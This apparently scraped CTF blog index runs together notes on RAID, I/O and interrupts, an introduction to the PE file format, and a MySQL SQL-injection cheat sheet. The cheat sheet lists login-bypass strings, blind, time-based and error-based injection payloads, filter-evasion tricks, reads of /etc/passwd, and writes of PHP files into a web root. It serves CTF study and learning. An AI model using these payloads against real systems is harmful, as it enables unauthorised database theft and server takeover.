第二步是执行控制字硬盘属于机械式部件, 其读写操作是串行的, 不可能在同一时刻既读又写, 也不可能在同一时刻读两组数据或写两组数据 磁盘阵列RAID 是将多个独立的物理磁盘组成一个独立的逻辑盘, 数据在多个物理盘上分割交叉存储,并行访问, 具有更好的存储性能,可靠性和安全性 方案 特点 方案 图示 RAIDO 无冗余和无校验的磁盘阵列 逻辑上相邻的两个扇区在物理上存到两个磁盘 RAID1 镜像磁盘阵列 存两份数据 RAID2 采用纠错的海明码的磁盘阵列 逻辑上连续的几个 bit 物理上分散存储在各个盘中4bit 信息位+3bit 海明校验位一一可纠正一位错 RAID3 位交叉奇偶校验的磁盘阵列 RAID4: 块交叉奇偶校验的磁盘阵列 RAID5 无独立校验的奇偶校验磁盘阵列 光盘存储器 特点存储密度高携带方便成本低容量大存储期限长容易保存 光盘的类型 CD-ROM只读型光盘, 只能读出其中内容, 不能写入或修改 CD-R只可写入一次信息, 之后不可修改 CD-RW可读可写光盘, 可以重复读写 DVD-ROM高容量的 CD-ROM, DVD 表示通用数字化多功能光盘 I/O 接口 I/O 接口的作用 数据缓冲通过数据缓冲寄存器(DBR)达到主机和外设工作速度的匹配 错误或状态监测通过状态寄存器反馈设备的各种错误,状态信息, 供 CPU 查用 控制和定时接收从控制总线发来的控制信号,时钟信号 数据格式转换串-并,并-串等格式转换 与主机和设备通信实现主机一 I/O 接口一 I/O 设备之间的通信 I/O 接口的工作原理 发命令发送命令字到 I/O 控制寄存器向设备发送命令(需要驱动程序的协助) 读状态从状态寄存器读取状态字获得设备或 I/O 控制器的状态信息 读/写数据从数据缓冲寄存器发送或读敢数据完成主机与外设的数据交换 I/O 端口及编址 端口 端口 数据端口可读可写 控制端口可读 状态端口可写 编址 统一编址把 I/O 端口当做存储器的单元进行地址分配用统一的访存指令就可以访问 I/O 端口又称存储器映射方式靠不同的地址码区分内存和 I/O 设备,I/O 地址要求相对固定在地址的某部分 优点不需要专门的输入/输出指令, 所有访存指令都可直接访问端口, 程序设计灵活性高端口有较大的编址空间读写控制逻辑电路简单 缺点端口占用了主存地址空间, 使主存地址空间变小外设寻址时间长(地址位数多, 地址译码速度慢) 独立编址I/O 端口地址与存储器地址无关独立编址 CPU 需要设置专门的输入/输出指令访问端口又称 I/O 映射方式靠不同的指令区分内存和 I/O 设备 优点使用专用 I/O 指令, 程序编制清晰I/O 端口地址位数少, 地址译码速度快I/O 端口的地址不占用主存地址空间 缺点I/O 指令类型少, 一般只能对端口进行传送操作, 程序设计灵活性差需要 CPU 提供存储器读/写,I/O 设备读/写两组控制信号, 增加了控制逻辑电路的复杂性 I/O 接口的类型 按数据传送方式 并行接口一个字节或一个字所有位同时传送 串行接口一位一位地传送 注:这里所说的数据传送方式指的是外设和接口一侧的传送方式, 而在主机和接口一侧接口要完成数据格式转换 按主机访问 I/O 设备的控制方式 程序查询接口 中断接口 DMA 接口 按功能选择的灵活性 可编程接口 不可编程接口 中断 中断的基本概念程序中断是指在计算机执行现行程序的过程中, 出现某些急需处理的异常情况或特殊请求, CCPU 暂时中止现行程序, 而转去对这些异常情况或特殊请求进行处理, 在处理完毕后 CPU 又自动返回到现行程序的断点处, 继续执行原程序 工作流程: 中断请求中断源向 CPU 发送中断请求信号 中断响应响应中断的条件中断判优:多个中断源同时提出请求时通过中断判优逻辑响应一个中断源 中断处理中断隐指令中断服务程序 中断请求标记为了记录中断事件并区分不同的中断源, 中断系统需对每个中断源设置中断请求标记触发器 INTR当其状态为1时, 表示中断源有请求对于外中断, CPU 是在统一的时刻即每条指令执行阶段结束前向接口发出中断查询信号, 以获取 I/O 的中断请求也就是说, CPU 响应中断的时间是在每条指令执行阶段的结束时刻CPU 响应中断必须满足以下 3 个条件: 中断源有中断请求 CPU 允许中断即开中断 一条指令执行完毕, 且没有更紧迫的任务 中断判优硬件实现是通过硬件排队器实现的, 它既可以设置在 CPU 中, 也可以分散在各个中断源中;软件实现是通过查询程序实现的 优先级设置 硬件故障中断属于最高级, 其次是软件中断 非屏蔽中断优于可屏蔽中断; DMA 请求优于 I/O 设备传送的中断请求 高速设备优于低速设备; 输入设备优于输出设备; 实时设备优于普通设备 中断处理过程 中断隐指令中断隐指令的主要任务: 关中断在中断服务程序中, 为了保护中断现场(即 CPU 主要寄存器中的内容)期间不被新的中断所打断, 必须关中断, 从而保证被中断的程序在中断服务程序执行完毕之后能接着正确地执行下去 保存断点为了保证在中断服务程序执行完毕后能正确地返回到原来的程序, 必须将原来程序的断点(即程序计数器(PC)的内容)保存起来可以存入堆栈, 也可以存入指定单元 引出中断服务程序引出中断服务程序的实质就是取出中断服务程序的入口地址并传送给程序计数器(PC) 中断服务程序 保护现场保存通用寄存器和状态寄存器的内容(eg:保存 Acc 寄存器的值), 以便返回原程序后可以恢复 CPU 环境可使用堆栈, 也可以使用特定存储单元 中断服务(设备服务)主体部分, 如通过程序控制需打印的字符代码送入打印机的缓冲存储器中 中断服务的过程中有可能修改 Acc 寄存器的值 恢复现场通过出栈指令或取数指令把之前保存的信息送回寄存器中 把原程序算到一般的 Acc 值恢复原样 中断返回通过中断返回指令回到原程序断点处 多重中断 单重中断指的是在中断服务程序中依然保持关中断 屏蔽字是用来解决中断优先级 中断屏蔽技术中断屏蔽技术主要用于多重中断, CPU 要具备多重中断的功能, 须满足下列条件 在中断服务程序中提前设置开中断指令 优先级别高的中断源有权中断优先级别低的中断源 每个中断源都有一个屏蔽触发器, 1 表示屏蔽该中断源的请求, 0 表示可以正常申请, 所有屏蔽触发器组合在一起, 便构成一个屏蔽字寄存器, 屏蔽字寄存器的内容称为屏蔽字屏蔽字设置的规律: 一般用 1表示屏蔽, 0表示正常申请 每个中断源对应一个屏蔽字(在处理该中断源的中断服务程序时, 屏蔽寄存器中的内容为该中断源对应的屏蔽字) 屏蔽字中 1越多, 优先级越高每个屏蔽字中至少有一个 1(至少要能屏蔽自身的中断)","link":"/COP-COP-7/"},{"title":"PE文件","text":"PE文件的简单介绍 前言PE 的全称是 Portable Executable，意为可移植的可执行的文件，常见的 EXE、DLL、OCX、SYS、COM 都是 PE 文件，PE 文件是微软 Windows 操作系统上的程序文件（可能是间接被执行，如 DLL）。PE 是一种数据结构，其中封装了 Windows OS 加载程序管理包装的可执行代码所需的信息。 RVA(relative virtual address)相对虚拟内存地址（Reverse Virtual Address , RVA）是相对于基地址的偏移，即 RVA 是虚拟内存中用来定位某个特定位置的地址，该地址的值是这个特定位置距离某个模块基地址的偏移量，所以说 RVA 是针对某个模块而存在的。 PE 文件的基本结构 这些部分是 PE 文件中真正用于 Win32 的部分，为了与 DOS 系统的文件格式兼容，在这部分的前面又加上了一个标准的 DOS MZ 格式的可执行部分，所有这些部分合起来组成了现在使用的 PE 文件。 1. DOS 文件头和 DOS 块（图中的 ①） PE 文件中包括一个标准的 DOS 可执行文件部分，该部分是用来向下兼容，如果在 DOS 下执行一个 PE 文件，系统可以将文件解释为 DOS 下的.exe 可执行格式，并执行 DOS 部分的代码。 PE 文件中的 DOS 部分由 MZ 格式的文件头和可执行代码部分组成，可执行代码被称为“DOS 块”（DOS stub）。 如果 e_magic 字段为 5A4DH 表示 DOS MZ header 有效。且 e_lfarlc 字段表示的是PE header的地址。 2. PE 文件头（也称 NT 文件头）（图中的 ②） PE 文件头是由 IMAGE_NT_HEADERS 结构定义的 如图 PE 文件头的第一个双字 Signature 是一个标志，它被定义为00004550h，也就是字符“P”，“E”加上两个 0。这也是“PE”这个称呼的由来，大部分的文件属性由标志后面的IMAGE_FILE_HEADER和IMAGE_OPTIONAL_HEADER32结构来定义。虽然这两个 PE 文件表头结构是可选的，但实际上这个名称是名不符实的，因为它总是存在于每个 PE 文件中。 IMAGE_FILE_HEADER 结构 标准IMAGE_FILE_HEADER紧跟在PE头标识后，即位于IMAGE_DOS_HEADER的e_lfanew值+4 的位置。由此位置开始的20个字节为数据结构标准 PE 头IMAGE_FILE_HEADER的内容。 Machine字段：来指定文件的运行平台 [点此查看预定义值] NumberOfSections字段：指出文件中存在的节的数量 TimeDateStamp字段：编译器创建此文件的时间，它的数值是从 1969 年 12 月 31 日下午 4：00 开始到创建时间为止的总秒数。 PointerToSymbolTable和NumberOfSymbols字段：这两个字段并不重要，它们与调试用的符号表有关。 SizeOfOptionalHeader字段：紧接在当前结构下面的IMAGE_OPTIONAL_HEADER32结构的长度，这个值等于00e0h。 Characteristics字段：属性标志字段，它的不同数据位定义了不同的文件属性 [点此查看预定义值] IMAGE_OPTIONAL_HEADER32 结构 AddressOfEntryPoit 字段指出文件被执行时的入口地址（这是一个 RVA 地址）。如果在一个可执行文件上附加了一段代码并想让这段代码首先被执行，那么只需要将这个入口地址指向附加的代码就可以了。 ImageBase 字段指出文件的优先装入地址。也就是说当文件被执行时，如果可能的话，Windows 优先将文件装入到由ImageBase字段指定的地址中，只有指定的地址已经被其他模块使用时，文件才被装入到其他地址中。 SectionAlignment 字段和 FileAlignment 字段SectionAlignment字段指定了节被装入内存后的对齐单位。也就是说，每个节被装入的地址必定是本字段指定数值的整数倍。而 FileAlignment 字段指定了节存储在磁盘文件中时的对齐单位。 Subsystem 字段指定使用界面的子系统。这个字段决定了系统如何为程序建立初始的界面。 DataDirectory 字段这个字段可以说是最重要的字段之一，它由 16 个相同的IMAGE_DATA_DIRECTORY结构组成，虽然 PE 文件中的数据是按照装入内存后的页属性归类而被放在不同的节中的，但是这些处于各个节中的数据按照用途可以被分为导出表、导入表、资源、重定位表等数据块，这 16 个IMAGE_DATA_DIRECTORY结构就是用来定义多种不同用途的数据块的。 如果将这 16 个 IMAGE_DATA_DIRECTORY 结构按照排列顺序编号为索引号 0 到 15，那么其用途和索引号是一一对应的，其对应关系如下表 索引 索引值在 Windows.inc 中的预定义值 对应的数据块 0 IMAGE_DIRECTORY_ENTRY_EXPORT 导出表地址和大小 1 IMAGE_DIRECTORY_ENTRY_IMPORT 导入表地址和大小 2 IMAGE_DIRECTORY_ENTRY_RESOURCE 资源表地址和大小 3 IMAGE_DIRECTORY_ENTRY_EXCEPTION 异常表地址和大小 4 IMAGE_DIRECTORY_ENTRY_SECURITY 属性证书数据地址和大小 5 IMAGE_DIRECTORY_ENTRY_BASERELOC 基地址重定位表地址和大小 6 IMAGE_DIRECTORY_ENTRY_DEBUG 调试信息地址和大小 7 IMAGE_DIRECTORY_ENTRY_ARCHITECTURE 版权信息 8 IMAGE_DIRECTORY_ENTRY_GLOBALPTR 指向全局指针寄存器的值 9 IMAGE_DIRECTORY_ENTRY_TLS 线程局部存储地址和大小 10 IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG 加载配置表地址和大小 11 IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT 绑定导入表地址和大小 12 IMAGE_DIRECTORY_ENTRY_IAT 导入函数地址表 13 IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT 延迟导入表地址和大小 14 IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR CLR 运行时头部数据地址和大小 15 未使用 例: 在 PE 文件中寻找特定的数据时就是从这些 IMAGE_DATA_DIRECTORY 结构开始的，比如要存取资源，那么必须从第 3 个 IMAGE_DATA_DIRECTORY 结构（索引为 2）中得到资源数据块的大小和位置；同理，如果要查看 PE 文件导入了哪些 DLL 文件的哪些 API 函数，那就必须首先从第 2 个 IMAGE_DATA_DIRECTORY 结构得到导入表的位置和大小。 3. 节表 节表头紧跟在IMAGE_NT_HEADERS后面 PE 文件中所有节的属性都被定义在节表中，节表由一系列的IMAGE_SECTION_HEADER结构排列而成，每个结构用来描述一个节，结构的排列顺序和它们描述的节在文件中的排列顺序是一致的。 节表被存放在紧接在 PE 文件头的地方，也就是从 PE 文件头 （注意：不是文件本身的头部） 开始的偏移为00f8h的地方。 PE 文件中的数据按照装入内存后的页面属性被划分成多个节，并由节表中的数据来描述这些节。一个节中的数据仅仅是属性相同而已，并不一定就是同一种用途的，比如导入表、导出表等就有可能和只读常量一起被放在同一个节中，因为它们的属性同是可读不可写的。其次，由于不同用途的数据可能被放在同一个节中，仅仅依靠节表是无法确定它们的存放位置的，PE 文件中依靠文件头中IMAGE_OPTIONAL_HEADER32结构内的数据目录表来指出它们的位置，可以由数据目录表来定位的数据包括导入表、导出表、资源、重定位表和 TLS 等 15 种数据。 节表中IMAGE_SECTION_HEADER结构的总数由 PE 文件头IMAGE_NT_HEADERS结构中的FileHeader.NumberOfSections字段指定。 IMAGE_SECTION_HEADER 结构的定义如下： 结构中的有些字段是供 COFF 格式的 obj 文件使用的，对可执行文件来说不代表任何意义，在分析的时候可以不予理会，真正有用的几个字段说明如下。 字段名 作用 备注 Name1 表示节的名称 每个节的名称是唯一的，不能有同名的两个节(，在 MASM32 产生的可执行文件中，代码节被命名为“.text”；可读写的数据节被命名为“.data”；包含只读数据、导入表以及导出表的节被命名为“.rdata”；而资源节被命名为“.rsrc”等。但是在其他一些编译器中，导入表被单独放在“.idata”中；而代码节可能被命名为“.code”。) VirtualSize 代表节的大小 这是节的数据在没有进行对齐处理前的实际大小 PointerToRawData 指出节在磁盘文件中的所处的位置 这个数值是从文件头开始算起的偏移量 SizeOfRawData 指出节在磁盘文件中所占的空间大小 ，这个数值等于 VirtualSize 字段的值按照 FileAlignment 的值对齐以后的大小 Characteristics 这是节的属性标志字段，其中的不同数据位代表了不同的属性 通过 Name1 、VirtualSize、PointerToRawData、SizeOfRawData ，装载器就可以从 PE 文件中找出某个节（从 PointerToRawData 偏移开始的 SizeOfRawData 字节）的数据，并将它映射到内存中去（映射到从模块基地址开始偏移 VirtualAddress 的地方，并占用以 VirtualSize 的值按照页的尺寸对齐后的空间大小）。 导入表 定义在 Win32 编程中常常用到“导入函数”（Import functions），导入函数就是被程序调用但其执行代码又不在程序中的函数，这些函数的代码位于一个或者多个 DLL 中，在调用者程序中只保留一些函数信息，包括函数名及其驻留的 DLL 名等，导入表中保存的正是函数名和其驻留的 DLL 名等动态链接所必需的信息。 导入表的位置导入表的位置和大小可以从 PE 文件头中IMAGE_OPTIONAL_HEADER32结构的数据目录字段中获取，对应的项目是 DataDirectory 字段的第 2 个IMAGE_DATA_DIRECTORY结构(也就是IMAGE_DIRECTORY_ENTRY_IMPORT) 导入表的结构 结构中的Name1字段指向此结构所对应的 DLL 文件 的名称，这个文件名是一个以NULL结尾的字符串。 OriginalFirstThunk字段和FirstThunk字段都指向一个包含一系列IMAGE_THUNK_DATA结构的数组，数组中的每个IMAGE_THUNK_DATA结构定义了一个导入函数的信息，数组的最后以一个内容为 0 的IMAGE_THUNK_DATA结构作为结束。 IMAGE_THUNK_DATA结构如下一个IMAGE_THUNK_DATA结构实际上就是一个双字，之所以把它定义成结构，是因为它在不同的时刻有不同的含义 最高位为 1 时，表示函数是以序号的方式导入的，这时双字的低位就是函数的序号。 当双字的最高位为 0 时，表示函数以字符串类型的函数名方式导入(这时双字的值是一个 RVA，指向一个用来定义导入函数名称的IMAGE_IMPORT_BY_NAME结构) OriginalFirstThunk指向的IMAGE_THUNK_DATA数组包含导入信息，在这个数组中只有Ordinal和AddressOfData是有用的，因此可以通过OriginalFirstThunk查找到函数的地址。 FirstThunk则略有不同，在 PE 文件加载以前或者说在导入表未处理以前，他所指向的数组与OriginalFirstThunk中的数组虽不是同一个，但是内容却是相同的，都包含了导入信息，而在加载之后，FirstThunk中的Function开始生效，他指向实际的函数地址，因为FirstThunk实际上指向IAT中的一个位置，IAT就充当了IMAGE_THUNK_DATA数组，加载完成后，这些 IAT 项就变成了实际的函数地址，即 Function 的意义。看图可能更方便与理解 导入地址表 IAT IMAGE_IMPORT_DESCRIPTOR结构中FirstThunk字段指向的数组最后会被替换成导入函数的真正入口地址，暂且把这个数组称为导入地址数组。在 PE 文件中，所有 DLL 对应的导入地址数组在位置上是被排列在一起的，全部这些数组的组合也被称为导入地址表（Import Address Table，或者简称为 IAT），导入表中第一个IMAGE_IMPORT_DESCRIPTOR结构的FirstThunk字段指向的就是 IAT 的起始地址。 还有一个方法可以更方便地找到 IAT 的地址，那就是通过数据目录表。数据目录表中的第 13 项（索引值为 12/IMAGE_DIRECTORY_ENTRY_IAT）直接用来定义 IAT 数据块的位置和大小。 扩展知识 装载 PE 文件的主要步骤 当 PE 文件被执行，PE 装载器检查 DOS MZ Header 里的 PE Header 偏移量，如果找到就跳转到 PE Heardr。 PE 装载器检查 PE Header 的有效性，如果有效就跳转到 PE Header 的尾部 下面紧跟 PE Heardr 的是节表。PE 装载器读取其中的节信息，并采用文件映射方法将这些节映射到内存，同时附上节表里指定的节属性。 PE 文件映射入内存后，PE 装载器将处理 PE 文件中类似 Import Tabel(引入表)逻辑部分。 检验 PE 文件的有效性 首先检验文件头部第一个字e_magic的值是否等于 5A4DH , 如果是，则检查第二项。 一旦证明文件的 DOS header 有效后，就用e_lfanew来定位 PE header 。比较 PE header 的 Signature 是否为 00004550h；是则可以认为该文件是一个有效的 PE 文件。 例: 查看 PE 文件 本次使用的是Detect it Easy，该软件为开源软件，有兴趣的可以去阅读源代码。 软件界面如下 选中程序后,点击 PE 按钮即可查看完整 PE 信息, 如图: 查看 PE 文件的导入表上面在IMAGE_OPTIONAL_HEADER32)中说过, IMAGE_OPTIONAL_HEADER32 中的 DataDirectory 里面的第二个 IMAGE_DATA_DIRECTORY 即为导入表。如图：在这里可以看到导入表的 16 进制信息,当然,这个软件将导入表的信息处理好放在 Import 下,让我们更好查看:在这个模块中,也将导入函数的相关信息等,还是比较方便的。 参考 《Windows 环境下 32 位汇编语言程序设计(典藏版)》 罗云彬[著] 《Windows PE 权威指南》戚利[著] 微软官方文档 PE 文件查看器Detect it Easy(点击转到下载地址)","link":"/CTF-PE-FILE/"},{"title":"SQL注入总结(MySQL)","text":"总结MySql注入的方法及绕过 常用信息 数据库信息的获取 注入方法 常见绕过 附录 常用信息 测试 payload(万能密码) 注释符号 常用运算符 常用函数和语句 字符串拼接 测试 payload(万能密码)其中单引号都可用换成双引号 123456789admin' --admin' #admin'\\/*1' or 1=1#1' or 1=1--1' or 1=1/*') or '1'='1') or ('1'='1'1 or '1 注释符号12345-- x#注意--后有一个空格, x为任意字符#/**/ # 多行注释,可以用来绕过空格过滤/*! */ # MYSQL特有;%00 常用运算符 运算符 说明 || 或,同or &amp;&amp; 与,同and ! 非,同not ^ 异或,同xor &amp; 按位与 | 按位或 &lt;&lt; 按位左移 &gt;&gt; 按位右移 ~ 按位取反 + 加, 可代替空格 - 减 * 乘 / 除 % 取余,同MOD = 等于 &lt;&gt; != 不等于 &lt; 小于 &gt; 大于 &lt;= 小于等于 &gt;= 大于等于 BETWEEN 在两值之间 NOT BETWEEN 不在两值之间 IN 在集合中 NOT IN 不在集合中 &lt;=&gt; 两个操作码均为 NULL 时, 其所得值为 1；而当一个操作码为 NULL 时, 其所得值为 0 LIKE 模糊匹配 REGEXP RLIKE 正则式匹配 IS NULL 为空 IS NOT NULL 不为空 常用函数和语句 函数 作用 user() 当前用户名 database() 当前数据库名 current_user() 当前用户,可用来查看权限 version() 数据库版本 @@datadir 数据库的路径 load_file() 读文件操作 into outfile()/into dumpfile 写文件操作 LENGTH(str) 返回字符串的长度. PI() 返回 π 的具体数值. REGEXP “statement” 正则匹配数据, 返回值为布尔值. LIKE “statement” 匹配数据, %代表任意内容. 返回值为布尔值. RLIKE “statement” 与 regexp 相同. LOCATE(substr,str,[pos]) 返回子字符串第一次出现的位置. POSITION(substr IN str) 等同于 LOCATE(). LOWER(str) 将字符串的大写字母全部转成小写. 同：LCASE(str). UPPER(str) 将字符串的小写字母全部转成大写. 同：UCASE(str). ELT(N,str1,str2,str3,…) 与 MAKE_SET(bit,str1,str2…)类似, 根据 N 返回参数值. NULLIF(expr1,expr2) 若 expr1 与 expr2 相同, 则返回 expr1, 否则返回 NULL. CHARSET(str) 返回字符串使用的字符集. DECODE(crypt_str,pass_str) 使用 pass_str 作为密码, 解密加密字符串 crypt_str. 加密函数：ENCODE(str,pass_str). 字符串拼接 函数 作用 SUBSTR(str,N_start,N_length) 对指定字符串进行截取，为 SUBSTRING 的简单版。 SUBSTRING() 多种格式 SUBSTRING(str,pos)、SUBSTRING(str FROM pos)、SUBSTRING(str,pos,len)、SUBSTRING(str FROM pos FOR len)。 RIGHT(str,len) 对指定字符串从最右边截取指定长度。 LEFT(str,len) 对指定字符串从最左边截取指定长度。 RPAD(str,len,padstr) 在 str 右方补齐 len 位的字符串 padstr，返回新字符串。如果 str 长度大于 len，则返回值的长度将缩减到 len 所指定的长度。 LPAD(str,len,padstr) 与 RPAD 相似，在 str 左边补齐。 MID(str,pos,len) 同于 SUBSTRING(str,pos,len)。 INSERT(str,pos,len,newstr) 在原始字符串 str 中，将自左数第 pos 位开始，长度为 len 个字符的字符串替换为新字符串 newstr，然后返回经过替换后的字符串。INSERT(str,len,1,0x0)可当做截取函数。 CONCAT(str1,str2…) 函数用于将多个字符串合并为一个字符串 GROUP_CONCAT(…) 返回一个字符串结果，该结果由分组中的值连接组合而成。 MAKE_SET(bits,str1,str2,…) 根据参数 1，返回所输入其他的参数值。可用作布尔盲注，如：EXP(MAKE_SET((LENGTH(DATABASE())&gt;8)+1,’1’,’710’))。 数据库信息的获取 数据库名 表名 列名 表中的数据 查询连接过数据库的所有 IP 和其连接过的总次数 注入方法 数据库名1234567891011#查看当前数据库SELECT database();#查看所有数据库show databases;SELECT schema_name FROM information_schema.schemata;SELECT table_schema FROM sys.schema_table_statistics GROUP BY table_schema;SELECT table_schema FROM sys.x$schema_flattened_keys GROUP BY table_schema;#通过不存在的函数名.可能可以得到数据库名SELECT a(); 表名1234567#查看指定数据库的表名SELECT grouop_concat(table_name) FROM information_schema.tables WHERE table_schema=database() SELECT GROUP_concat(table_name) FROM mysql.innodb_table_stats WHERE database_name=database() # 查询被访问过的表SELECT table_name FROM sys.schema_table_statistics WHERE table_schema='mspwd' GROUP BY table_name; SELECT table_name FROM sys.x$schema_flattened_keys WHERE table_schema='mspwd' GROUP BY table_name; 列名12345678910111213141516171819#通过预定义的分析诊断工具, 在执行完语句后加上即可procedure analyse() #如:SELECT * FROM `users` procedure analyse()# 查询指定表的列名SELECT GROUP_concat(column_name) FROM information_schema.columns WHERE table_name = 表名;# 通过比较数据大小,获得表中的数据SELECT ((SELECT 1,'Dumb',&quot;Dum&quot;)&gt;(SELECT * FROM users LIMIT 1))#通过join后出现相同列名,报错查看其他列名SELECT * FROM `users` union SELECT * FROM (SELECT * FROM users as a join users b)c /*注: 执行完上面语句后,会提示 Duplicate column name 'id' 这就是第一列的列名 得到第一列列名后,通过 using 声明内连接来避免报错, 执行下面语句后,得出第二列列名,以此类推 SELECT * FROM `users` union SELECT * FROM (SELECT * FROM users as a join users b using(id))c */#猜列名and 列名 is not nulland substr(列名,1,1)='a 表中的数据12#查询表中的指定列数据(其中的`1`即为第几列)SELECT GROUP_concat(`1`) FROM (SELECT 1,2,3 union SELECT * FROM users)x; 查询连接过数据库的所有 IP 和其连接过的总次数1SELECT host,total_connections FROM sys.host_summary; 查看 SQL 语句执行的记录1SELECT * FROM sys.x$statement_analysis; 注入方法 union 联合注入 堆叠注入 盲注 布尔盲注 时间盲注 报错注入 二次注入 limit 注入 update 注入 insert 注入 ORDER BY 注入 GROUP BY 注入 读写文件 无列名盲注 union 联合注入基本步骤:[1]猜语句结构并闭合--&gt;[2]猜查询字段数--&gt;[3]拼接查询语句 猜查询字段数方法 123456789#若实际查询列数大于, 则页面错误/无内容, 若小于或等于, 则页面正常GROUP BY 第几列ORDER BY 第几列#使用union, union SELECT几列成功,就有几列数据union SELECT 1,2,3,4,x...#使用limit 获得查询列数,有几列就几个@, 如果不一致则报错SELECT * FROM users ORDER BY id desc limit 0,1 into @,@,@ 堆叠注入可以用 ; 来结束语句,并执行其他语句 1234567891011#查看数据库相关信息;show databases;;show tables;;show columns FROM 表名;#更新数据;update users set password=&quot;123456&quot; WHERE 1;#预处理语句;PREPARE hack FROM &quot;要执行的sql语句的字符串(可以为16进制、char组成的字符串等)&quot;;EXECUTE hack;#;SET @hacksql = &quot;要执行的sql语句的字符串(可以为16进制、char组成的字符串等)&quot;;PREPARE hack FROM @hacksql;EXECUTE hack;# 盲注 布尔盲注对真或假条件返回的内容容易区分时使用 常用 payload 12345#让前面的语句为假,判断后面的语句SELECT * FROM users WHERE username = '1' and if(ascii(substr(database(),1,1))&lt;128,1,0);#SELECT * FROM users WHERE username = '1' and ascii(substr(database(),1,1))&lt;128; ## 如果注释符被过滤, 可以类似与这样改SELECT * FROM users WHERE username = '1' and ascii(substr(database(),1,1))&lt;128 and '1'='1 时间盲注对真或假条件返回的内容难区分时使用 常用 payload(可以发现只是在 bool 盲注的基础上,使语句成功时等待一段时间) 12345#让前面的语句为假,判断后面的语句SELECT * FROM users WHERE username = '1' and if(ascii(substr(database(),1,1))&lt;128,sleep(3),0);#SELECT * FROM users WHERE username = '1' and ascii(substr(database(),1,1))&lt;128 and sleep(3) ## 如果注释符被过滤, 可以类似与这样改SELECT * FROM users WHERE username = '1' and ascii(substr(database(),1,1))&lt;128 and sleep(3)and '1'='1 报错注入在执行错误语句时,会输出报错信息 exp 报错exp 参数很大时,会产生报错信息1exp(~(SELECT * FROM(SELECT user())a)); pow 报错原理同 exp1pow(~(SELECT * FROM(SELECT user())a),9999); updatexml 报错updatexml 是由于参数的格式不正确而产生的错误12SELECT name FROM user WHERE id=1 and updatexml(1,concat('~',(要查询的内容),'~'),3);#SELECT name FROM user WHERE id=1 and updatexml(1,concat(0x7e,(要查询的内容),0x7e),3);# extractvalue 报错原理同 updatexml1SELECT username FROM user WHERE id=1 and extractvalue(1,concat(0x7e,(要查询的内容),0x7e))# rand()+GROUP()+count()原理: 由于由于WHERE条件每执行一次, rand函数就会执行一次, 在统计数据时判断依据不能动态改变, 所以ORDER/GROUP BY后不能接rand()floor(rand(0)*2)是为了随机获得 0 和 112(SELECT count(*) FROM information_schema.tables GROUP BY concat((SELECT user()),0x7e,floor(rand(0)*2)));union SELECT count(*),concat((SELECT GROUP_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),'~',floor(rand(0)*2))as a FROM information_schema.tables GROUP BY a # 二次注入将恶意数据存储到数据库后, 被读到 SQL 语句中导致的注入,如:将username = 'admin' #'存储到数据库中, 由于 php 中使用 addslashes 会给单引号转义成为 admin\\' #, 但是存入数据库时, 数据库会把 \\' 看成转义字符 变成'来存储,所以最终存入数据库的值为 admin' #, 执行时就变成了 1SELECT * FROM users WHERE username = 'adimn' #' limit 注入使用 procedure analyse 注入,analyse 可以有两个参数: max_elements:指定每列非重复值的最大值, 当超过这个值的时候, MySQL 不会推荐 enum 类型. （默认值 256） max_memory （默认值 8192）analyse()为每列找出所有非重复值所采用的最大内存大小. 12345678#得到列的相关信息SELECT * FROM users ORDER BY id desc limit 0,1 procedure analyse(1,1)#与报错注入结合,得到其他信息SELECT id FROM users limit 2 procedure analyse(extractvalue(1,concat(0x3a,version())),1);#写文件SELECT * FROM users ORDER BY id desc limit 0,1 into outfile &quot;/var/www/html/1.php&quot; LINES TERMINATED BY 0x16进制字符串#获得查询列数,有几列就几个@, 如果不一致则报错SELECT * FROM users ORDER BY id desc limit 0,1 into @,@,@ update 注入update 注入一般使用盲注 1234#其中条件可以是任意表达式,如果条件为真,则会等待5秒, 但是修改后的字段值还是 123update users set password='123'|if(条件,sellp(5), 1) WHERE id = 14;#如果表达式为真则会将字段名修改为 1update users set password = '0' | (substr(database(),1,1) = 's') WHERE id=14; insert 注入原理同 update 注入 1234#其中条件可以是任意表达式,如果条件为真,则会等待5秒, 但是修改后的字段值还是 123insert users value (14, &quot;CSHF&quot;, &quot;0&quot;|if(条件,sellp(5), 1));#如果表达式为真则会将字段名修改为 1insert users value (14, &quot;CSHF&quot;, &quot;0&quot;|(substr(database(),1,1) = 's'); ORDER BY 注入使用报错注入 1SELECT * FROM users ORDER BY updatexml(1,concat('~',(要查询的内容),'~'),3);# GROUP BY 注入也相当于是 bool 盲注 1SELECT * FROM users GROUP BY 1 having substr((SELECT database()),1,1)&lt;'z' 读写文件 读文件 1234SELECT LOAD_FILE('/etc/passwd')SELECT LOAD_FILE(0x2f6574632f706173737764)load data infile &quot;/etc/passwd&quot; into table test FIELDS TERMINATED BY '\\n'; #读取服务端文件load data local infile &quot;/etc/passwd&quot; into table test FIELDS TERMINATED BY '\\n'; #读取客户端文件 写文件 123SELECT '&lt;?php phpinfo();?&gt;' into outfile '/var/www/html/1.php'SELECT version() into outfile &quot;/var/www/html/test.php&quot; LINES TERMINATED BY 0x3c3f70687020706870696e666f28293b3f3e # 这里写16进制的字符串 无列名盲注子查询可以使用 &gt;, =, &lt; 来进行比较一般结合bool盲注使用, 注: 对字母的大小写不敏感, 也就是说 'a' = 'A' 1(select 'admin','admin')&gt;(select * from users limit 1) 常见绕过 and 或 or 被过滤/拦截 结果中的关键字被过滤 空格被过滤/拦截 单双引号 逗号被过滤 等号或 like 被过滤 if 被过滤 union被过滤 数字被过滤 HANDLER 语句代替SELECT查询 and 或 or 被过滤/拦截 双写 aandnd、oorr &amp;&amp; 等于 and, || 等于 or 拼接等号=, 如: id=1=(表达式) 使用异或号 xor,^, 如 id=1^(表达式), id=(1)xor(表达式) 结果中的关键字被过滤 使用 replace(group_concat(username),'flag','galf') 空格被过滤/拦截 使用括号嵌套 用注释/**/, /*! */代替空格 使用 + 代替空格 使用不可见字符代替空格, 如 %09 %0a %0b %0c %0d %a0 等 and/or前的空格可省略, and/or后面可用跟上偶数个! 或~来代替空格 例: SELECT/**/*/*!*/FROM/**/users/**/WHERE+id =1/**/or!!~~1 单双引号 如果需要闭合单双引号, 尝试是否存在编码问题,通过编码来闭合 或者是否存在二次注入来闭合引号 如果不需要闭合引号, 可以使用字符串的 16 进制表示一个字符串, 也可以通过 char 或 concat与chr组合 